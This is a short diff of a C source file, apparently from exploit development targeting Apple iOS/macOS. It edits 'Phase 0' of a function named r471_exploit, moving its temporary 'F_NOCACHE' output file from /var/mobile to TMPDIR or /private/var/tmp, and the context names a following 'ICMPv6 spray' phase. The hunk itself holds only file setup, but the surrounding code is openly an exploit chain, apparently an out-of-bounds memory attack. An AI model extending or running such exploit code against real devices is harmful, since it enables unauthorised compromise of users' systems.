@@ -17751,13 +17751,22 @@ static void r471_exploit(void) {
     /* Phase 0: F_NOCACHE output file */
     rlog("  --- Phase 0: Output file (F_NOCACHE) ---\n"); fflush(stdout);
     char tmppath[256];
-    snprintf(tmppath, sizeof(tmppath), "/var/mobile/tmp_r471_%d", getpid());
-    int fd = open(tmppath, O_RDWR | O_CREAT | O_TRUNC, 0644);
+    const char *tmpdir = getenv("TMPDIR");
+    int fd = -1;
+    if (tmpdir) {
+        snprintf(tmppath, sizeof(tmppath), "%s/r471_oob", tmpdir);
+        fd = open(tmppath, O_RDWR | O_CREAT | O_TRUNC, 0600);
+    }
+    if (fd < 0) {
+        snprintf(tmppath, sizeof(tmppath), "/private/var/tmp/r471_oob_%d", getpid());
+        fd = open(tmppath, O_RDWR | O_CREAT | O_TRUNC, 0600);
+    }
+    if (fd < 0) { rlog("    FAILED to open file\n"); rlog("\n=== r471 done ===\n"); return; }
     fcntl(fd, F_NOCACHE, 1);
     char *zbuf = (char *)calloc(1, R471_SURF_SZ);
     pwrite(fd, zbuf, R471_SURF_SZ, 0);
     free(zbuf);
-    rlog("    fd=%d\n", fd);
+    rlog("    fd=%d path=%s\n", fd, tmppath);
 
     /* Phase 1: ICMPv6 spray */
     rlog("  --- Phase 1: ICMPv6 spray ---\n"); fflush(stdout);
